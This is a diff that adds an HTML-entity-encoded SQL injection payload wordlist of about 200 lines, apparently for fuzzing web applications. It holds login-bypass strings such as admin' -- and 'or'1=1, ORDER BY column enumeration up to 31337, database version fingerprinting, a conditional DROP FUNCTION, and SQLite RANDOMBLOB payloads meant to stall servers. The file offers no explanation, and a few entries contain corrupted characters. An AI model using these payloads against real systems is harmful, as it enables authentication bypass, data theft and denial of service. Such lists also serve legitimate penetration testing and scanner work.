@@ -1,0 +1,208 @@
+&#39;
+&#39;&#39;
+`
+``
+,
+&quot;
+&quot;&quot;
+&#47;
+&#47;&#47;
+&#92;
+&#92;&#92;
+;
+&#39;=&#39;
+&#39;LIKE&#39;
+&#39;=0--+
+0%
+@variable
+@@variable
+AND 1
+AND 0
+AND true
+AND false
+1-false
+1-true
+1*56
+-2
+1&#39; ORDER BY 1--+
+1&#39; ORDER BY 2--+
+1&#39; ORDER BY 3--+
+1&#39; ORDER BY 1,2--+
+1&#39; ORDER BY 1,2,3--+
+1&#39; GROUP BY 1,2,--+
+1&#39; GROUP BY 1,2,3--+
+&#39; GROUP BY columnnames having 1=1 --
+OR 1=0
+OR x=x
+OR x=y
+OR 1=0#
+OR x=x#
+OR x=y#
+OR 1=0--
+OR x=x--
+OR x=y--
+HAVING 1=1
+HAVING 1=0
+HAVING 1=1#
+HAVING 1=0#
+HAVING 1=1--
+HAVING 1=0--
+AND 1=0
+AND 1=0--
+AND 1=0#
+ORDER BY 1--
+ORDER BY 2--
+ORDER BY 3--
+ORDER BY 4--
+ORDER BY 5--
+ORDER BY 6--
+ORDER BY 7--
+ORDER BY 8--
+ORDER BY 9--
+ORDER BY 10--
+ORDER BY 11--
+ORDER BY 12--
+ORDER BY 13--
+ORDER BY 14--
+ORDER BY 15--
+ORDER BY 16--
+ORDER BY 17--
+ORDER BY 18--
+ORDER BY 19--
+ORDER BY 20--
+ORDER BY 21--
+ORDER BY 22--
+ORDER BY 23--
+ORDER BY 24--
+ORDER BY 25--
+ORDER BY 26--
+ORDER BY 27--
+ORDER BY 28--
+ORDER BY 29--
+ORDER BY 30--
+ORDER BY 31337--
+ORDER BY 1#
+ORDER BY 2#
+ORDER BY 3#
+ORDER BY 4#
+ORDER BY 5#
+ORDER BY 6#
+ORDER BY 7#
+ORDER BY 8#
+ORDER BY 9#
+ORDER BY 10#
+ORDER BY 11#
+ORDER BY 12#
+ORDER BY 13#
+ORDER BY 14#
+ORDER BY 15#
+ORDER BY 16#
+ORDER BY 17#
+ORDER BY 18#
+ORDER BY 19#
+ORDER BY 20#
+ORDER BY 21#
+ORDER BY 22#
+ORDER BY 23#
+ORDER BY 24#
+ORDER BY 25#
+ORDER BY 26#
+ORDER BY 27#
+ORDER BY 28#
+ORDER BY 29#
+ORDER BY 30#
+ORDER BY 31337#
+ORDER BY 1
+ORDER BY 2
+ORDER BY 3
+ORDER BY 4
+ORDER BY 5
+ORDER BY 6
+ORDER BY 7
+ORDER BY 8
+ORDER BY 9
+ORDER BY 10
+ORDER BY 11
+ORDER BY 12
+ORDER BY 13
+ORDER BY 14
+ORDER BY 15
+ORDER BY 16
+ORDER BY 17
+ORDER BY 18
+ORDER BY 19
+ORDER BY 20
+ORDER BY 21
+ORDER BY 22
+ORDER BY 23
+ORDER BY 24
+ORDER BY 25
+ORDER BY 26
+ORDER BY 27
+ORDER BY 28
+ORDER BY 29
+ORDER BY 30
+ORDER BY 31337
+IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--
+IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--
+and (select substring(@@version,1,1))=&#39;X&#39;
+and (select substring(@@version,1,1))=&#39;M&#39;
+and (select substring(@@version,2,1))=&#39;i&#39;
+and (select substring(@@version,2,1))=&#39;y&#39;
+and (select substring(@@version,3,1))=&#39;c&#39;
+and (select substring(@@version,3,1))=&#39;S&#39;
+and (select substring(@@version,3,1))=&#39;X&#39;
+&#39;&#92;&quot;
+RANDOMBLOB(500000000&#47;2)
+AND 2947=LIKE(&#39;ABCDEFG&#39;,UPPER(HEX(RANDOMBLOB(500000000&#47;2))))
+OR 2947=LIKE(&#39;ABCDEFG&#39;,UPPER(HEX(RANDOMBLOB(500000000&#47;2))))
+RANDOMBLOB(1000000000&#47;2)
+AND 2947=LIKE(&#39;ABCDEFG&#39;,UPPER(HEX(RANDOMBLOB(1000000000&#47;2))))
+OR 2947=LIKE(&#39;ABCDEFG&#39;,UPPER(HEX(RANDOMBLOB(1000000000&#47;2))))
+&#39;-&#39;
+&#39; &#39;
+&#39;&amp;&#39;
+&#39;^&#39;
+&#39;*&#39;
+&quot;-&quot;
+&quot; &quot;
+&quot;&amp;&quot;
+&quot;^&quot;
+&quot;*&quot;
+or true--
+admin&#39; --
+admin&#39; #
+admin&#39;&#47;*
+admin&quot; --
+admin&quot; #
+admin&quot;&#47;*
+==
+=
+&#39;
+&#39; --
+&#39; #
+&#39; �
+&#39;--
+&#39;&#47;*
+&#39;#
+&quot; --
+&quot; #
+&quot;&#47;*
+or true
+&#39; group by password having 1=1--
+&#39; group by userid having 1=1--
+&#39; group by username having 1=1--
+like &#39;%&#39;
+or 0=0 --
+or 0=0 #
+or 0=0 �
+&#39;or&#39;1=1
+&#39;or&#39;1=1?
+&#39;=&quot;or&#39;
+&#39;&#92;&quot;
+RANDOMBLOB(500000000&#47;2)
+AND 2947=LIKE(&#39;ABCDEFG&#39;,UPPER(HEX(RANDOMBLOB(500000000&#47;2))))
+OR 2947=LIKE(&#39;ABCDEFG&#39;,UPPER(HEX(RANDOMBLOB(500000000&#47;2))))
+RANDOMBLOB(1000000000&#47;2)
+AND 2947=LIKE(&#39;ABCDEFG&#39;,UPPER(HEX(RANDOMBLOB(1000000000&#47;2))))
+OR 2947=LIKE(&#39;ABCDEFG&#39;,UPPER(HEX(RANDOMBLOB(1000000000&#47;2))))
